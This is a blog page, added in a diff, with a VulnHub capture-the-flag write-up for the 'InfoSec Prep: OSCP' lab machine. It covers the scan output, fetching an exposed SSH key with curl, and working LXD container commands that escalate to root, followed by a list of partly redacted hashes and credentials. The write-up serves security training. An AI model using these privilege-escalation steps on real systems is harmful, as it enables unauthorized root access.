@@ -1,0 +1,74 @@
+<!DOCTYPE html><html lang=en><head><meta charset=utf-8><meta name=author content="Ankur Tyagi (@7h3rAm)"><meta name=description content="Personal Weblog"><meta content="width=device-width, initial-scale=1" name=viewport><title>मंथन | Mannthan</title><link href=/static/images/mannthan-32x32.png.webp sizes=32x32 rel=icon type=image/webp><script src=/static/js/highlight.min.js></script><script src=/static/js/highlightjs-line-numbers.min.js></script><script charset=UTF-8 src=/static/js/go.min.js></script><link rel=stylesheet href=/static/css/github-gist.min.css><link rel=stylesheet type=text/css href=/static/css/style.md.css media=screen></head><body><div class=header><table><tr><td><a href=/index.html style="color:#fe4164; font-size:14pt;">🏡 मंथन </a></td><td><a href=/archive.html style="color:#f90; font-size:14pt;">💾 Archive </a></td><td><a href=/tags.html style="color:#69359c; font-size:14pt;">🔖 Tags </a></td><td><a href=/stats.html style="color:#20b2aa; font-size:14pt;">📊 Stats</a></td></tr></table></div><div class=body><h1 class="h1 collapsible" onclick=toggle(this);>[VulnHub] InfoSec Prep: OSCP</h1><p><a href=/posts/20200625_htb-bashed.html> « </a>📅 published on <code>10/Aug/2020</code></p><h2 class="h2 collapsible" onclick=toggle(this);>Overview</h2><p class=nested>This is a writeup for VulnHub VM <a href=https://www.vulnhub.com/entry/infosec-prep-oscp,508/ ><code>InfoSec Prep: OSCP</code></a>. Here's an overview of the <code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code> process:</p><p class=nested><img alt=writeup.overview.killchain src=/static/files/posts_vulnhub_infosecpreposcp/killchain.png.webp></p><h2 class="h2 collapsible" onclick=toggle(this);>Phase #1: Enumeration</h2><p class=nested>1. Here's the Nmap scan result: </p><pre class=nested><code># Nmap 7.80 scan initiated Mon Jul 20 12:03:57 2020 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /home/kali/toolbox/repos/writeupsall/vulnhub.infosecpreposcp/192.168.119.198/scans/_quick_tcp_nmap.txt -oX /home/kali/toolbox/repos/writeupsall/vulnhub.infosecpreposcp/192.168.119.198/scans/xml/_quick_tcp_nmap.xml 192.168.119.198
+Nmap scan report for 192.168.119.198
+Host is up, received user-set (0.0022s latency).
+Scanned at 2020-07-20 12:04:12 IST for 9s
+Not shown: 998 closed ports
+Reason: 998 conn-refused
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
+|_http-generator: WordPress 5.4.2
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 1 disallowed entry 
+|_/secret.txt
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: OSCP Voucher &amp;#8211; Just another WordPress site
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Jul 20 12:04:21 2020 -- 1 IP address (1 host up) scanned in 24.59 seconds
+
+</code></pre><p class=nested>2. We find <code>80/tcp</code> to be open. Upon browsing the webpage we see that it looks to be a Wordpress blog with a post named "OSCP Voucher". This posts lists the process to submit the flag and also mentions that there's a user named <code>oscp</code> on this machine: </p><p class=nested><img alt=writeup.enumeration.steps.2.1 src=/static/files/posts_vulnhub_infosecpreposcp/screenshot01.png.webp> </p><p class=nested>3. The <code>gobuster</code> scan result confirms that this is a Wordpress blog. We see an interesting entry <code>secret.txt</code> from <code>gobuster</code> scan results and also from the <code>robots.txt</code> file: </p><p class=nested><img alt=writeup.enumeration.steps.3.1 src=/static/files/posts_vulnhub_infosecpreposcp/screenshot02.png.webp> </p><p class=nested><img alt=writeup.enumeration.steps.3.2 src=/static/files/posts_vulnhub_infosecpreposcp/screenshot03.png.webp> </p><p class=nested>4. This file has base64 encoded content that we decode to find a SSH private key file: </p><pre class=nested><code>curl http://192.168.119.198/secret.txt | base64 -d -
+</code></pre><p class=nested><img alt=writeup.enumeration.steps.4.1 src=/static/files/posts_vulnhub_infosecpreposcp/screenshot04.png.webp> </p><h3 class="h3 collapsible" onclick=toggle(this);>Findings</h3><h4 class="h4 collapsible" onclick=toggle(this);>Open Ports</h4><pre class=nested><code>22/tcp      ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux protocol 2.0)
+80/tcp      http       Apache httpd 2.4.41 ((Ubuntu))
+33060/tcp   socks5
+</code></pre><h4 class="h4 collapsible" onclick=toggle(this);>Files</h4><pre class=nested><code>http://192.168.119.198/secret.txt
+http://192.168.119.198/license.txt
+</code></pre><h4 class="h4 collapsible" onclick=toggle(this);>Users</h4><pre class=nested><code>ssh: oscp
+wordpress: admin
+</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>Phase #2: Exploitation</h2><p class=nested>1. We can try to SSH into the machine as user <code>oscp</code> using the SSH private key file. First, we need to set right permissions to the key file and then use it for login: </p><pre class=nested><code>curl http://192.168.119.198/secret.txt | base64 -d - &gt;./sshkey.pvt
+chmod 600 sshkey.pvt
+ssh -i sshkey.pvt oscp@192.168.119.198
+</code></pre><p class=nested><img alt=writeup.exploitation.steps.1.1 src=/static/files/posts_vulnhub_infosecpreposcp/screenshot05.png.webp> </p><p class=nested>2. We successfully login and get interactive access of the machine as user <code>oscp</code>: </p><p class=nested><img alt=writeup.exploitation.steps.2.1 src=/static/files/posts_vulnhub_infosecpreposcp/screenshot06.png.webp> </p><h2 class="h2 collapsible" onclick=toggle(this);>Phase #2.5: Post Exploitation</h2><pre class=nested><code>oscp@oscp&gt; id
+uid=1000(oscp) gid=1000(oscp) groups=1000(oscp),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)
+oscp@oscp&gt;  
+oscp@oscp&gt; uname
+Linux oscp 5.4.0-40-generic #44-Ubuntu SMP Tue Jun 23 00:01:04 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+oscp@oscp&gt;  
+oscp@oscp&gt; ifconfig
+eth0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+  inet 192.168.119.198  netmask 255.255.255.0  broadcast 192.168.119.255
+  inet6 fe80::20c:29ff:fee6:a4ab  prefixlen 64  scopeid 0x20&lt;link&gt;
+  ether 00:0c:29:e6:a4:ab  txqueuelen 1000  (Ethernet)
+  RX packets 389730  bytes 88031188 (88.0 MB)
+  RX errors 0  dropped 0  overruns 0  frame 0
+  TX packets 297471  bytes 52912167 (52.9 MB)
+  TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt;  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10&lt;host&gt;
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 694  bytes 64212 (64.2 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 694  bytes 64212 (64.2 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+oscp@oscp&gt;  
+oscp@oscp&gt; users
+root
+oscp
+</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>Phase #3: Privilege Escalation</h2><p class=nested>1. From the output of command <code>id</code>, we see that the user <code>oscp</code> is a member of <code>lxd</code> group. We can exploit this misconfiguration to create a dummy container that mounts the local file system and gain access to all privileged files. But we see that the <code>lxc</code> command for this to work is not found in our current environment path: </p><pre class=nested><code>lxc init ubuntu:16.04 test -c security.privileged=true
+  -bash: lxc: command not found
+</code></pre><p class=nested><img alt=writeup.privesc.steps.1.1 src=/static/files/posts_vulnhub_infosecpreposcp/screenshot09.png.webp> </p><p class=nested>2. We locate the file and use it's absolute path to create the container. This time we see another error about storage pool. The error message helpfully points us in the right direction and we need to initialize LXD first. We use the suggested command with the absolute path and choose default settings when prompted for a change: </p><pre class=nested><code>/snap/bin/lxd init
+/snap/bin/lxc init ubuntu:16.04 test -c security.privileged=true
+/snap/bin/lxc config device add test whatever disk source=/ path=/mnt/root recursive=true 
+/snap/bin/lxc start test
+/snap/bin/lxc exec test bash
+</code></pre><p class=nested><img alt=writeup.privesc.steps.2.1 src=/static/files/posts_vulnhub_infosecpreposcp/screenshot10.png.webp> </p><p class=nested><img alt=writeup.privesc.steps.2.2 src=/static/files/posts_vulnhub_infosecpreposcp/screenshot11.png.webp> </p><p class=nested><img alt=writeup.privesc.steps.2.3 src=/static/files/posts_vulnhub_infosecpreposcp/screenshot12.png.webp> </p><p class=nested><img alt=writeup.privesc.steps.2.4 src=/static/files/posts_vulnhub_infosecpreposcp/screenshot13.png.webp> </p><h2 class="h2 collapsible" onclick=toggle(this);>Learning/Recommendation</h2><ul class=nested><li>The SSH key for a user on the target machine was exposed via web application. Although the file was base64 encoded and listed within <code>robots.txt</code>, it doesn't stop an attacker from accessing it.</li><li>The local user was member of the LXD group which allowed to create a privileged container with access to the entire file system. This lead to complete access of files, even those that have been restricted to <code>root</code> user only.</li></ul><h2 class="h2 collapsible" onclick=toggle(this);>Loot</h2><h3 class="h3 collapsible" onclick=toggle(this);>Hashes</h3><pre class=nested><code>oscp:$6$k8OEgwaFdUqpVETQ$sKlBojI3IYunw8wEDAyoFdHgVtOPzkDPqksql7IWzpfZXpd3UqP569BokTZ52mDroq/rmJY9zgfeQVmB.........................
+root:$6$.wvqHr9ixq/hDW8t$a/dHKimULfr5rJTDlS7uoUanuJB2YUUkh.LWSKF7kTNp4aL8UTlOk2wT8IkAgJ.vDF/ThSIOegsuclEg.........................
+</code></pre><h3 class="h3 collapsible" onclick=toggle(this);>Credentials</h3><pre class=nested><code>mysql: wordpress/Oscp12....
+wordpress: admin:$P$Bx9ohXoCVR5lkKtuQbuWuh2........
+</code></pre><h3 class="h3 collapsible" onclick=toggle(this);>Flags</h3><pre class=nested><code>/mnt/root/root/flag.txt: d73b04b0e696b0945283d...........
+</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>References</h2><ul class=nested><li><a href=https://www.vulnhub.com/entry/infosec-prep-oscp,508/ >https://www.vulnhub.com/entry/infosec-prep-oscp,508/</a> </li><li><a href=https://reboare.github.io/lxd/lxd-escape.html>https://reboare.github.io/lxd/lxd-escape.html</a> </li><li><a href=https://book.hacktricks.xyz/linux-unix/privilege-escalation/lxd-privilege-escalation>https://book.hacktricks.xyz/linux-unix/privilege-escalation/lxd-privilege-escalation</a> </li><li><a href=https://medium.com/@falconspy/infosec-prep-oscp-vulnhubwalkthrough-a09519236025>https://medium.com/@falconspy/infosec-prep-oscp-vulnhubwalkthrough-a09519236025</a> </li></ul><p style=text-align:center;>(🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p><p style=text-align:center;>« <a href=/posts/20200625_htb-bashed.html>[HackTheBox] Bashed</a> «</p></div><script>hljs.initHighlightingOnLoad();</script><script>hljs.initLineNumbersOnLoad();</script><script>function toggle(s){s.classList.toggle("expanded");var t=!1,i=!1,a=!1;s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0),console.log(s),console.log(t),console.log(i),console.log(a);for(var l=s.nextElementSibling;l;){if(t&&l.classList.contains("h2")){l.classList.toggle("active");break}if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){l.classList.toggle("active");break}if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){l.classList.toggle("active");break}l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling}}</script><div class=footer><p><a href=https://creativecommons.org/licenses/by-sa/4.0/ rel=license><img src=/static/files/ccbysa4.svg></a></p></div></body></html>
